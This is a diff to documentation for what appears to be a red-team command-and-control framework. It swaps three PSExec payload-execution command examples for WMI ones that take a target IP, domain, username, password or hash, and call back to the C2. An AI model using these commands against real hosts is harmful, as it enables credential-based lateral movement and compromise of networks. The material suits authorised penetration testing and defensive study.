@@ -21,23 +21,23 @@ To demonstrate the simplicity of this attack, the following command shows how si
 Syntax
 -----------------
 
-**PSExec using the normal comms method back to the C2**
+**WMI Exec using the normal comms method back to the C2**
 
 .. code-block:: powershell
 
-	Invoke-PsExecPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>
+	Invoke-WMIPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>
 
-**PSExec using the normal comms method back to the C2**
-
-.. code-block:: powershell
-
-	Invoke-PsExecProxyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>
-
-**PSExec using the normal comms method back to the C2**
+**WMI Exec using the normal comms method back to the C2**
 
 .. code-block:: powershell
 
-	Invoke-PsExecDiasyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>
+	Invoke-WMIProxyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>
+
+**WMI Exec using the normal comms method back to the C2**
+
+.. code-block:: powershell
+
+	Invoke-WMIDiasyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>
 
 -----------------
 Parameters
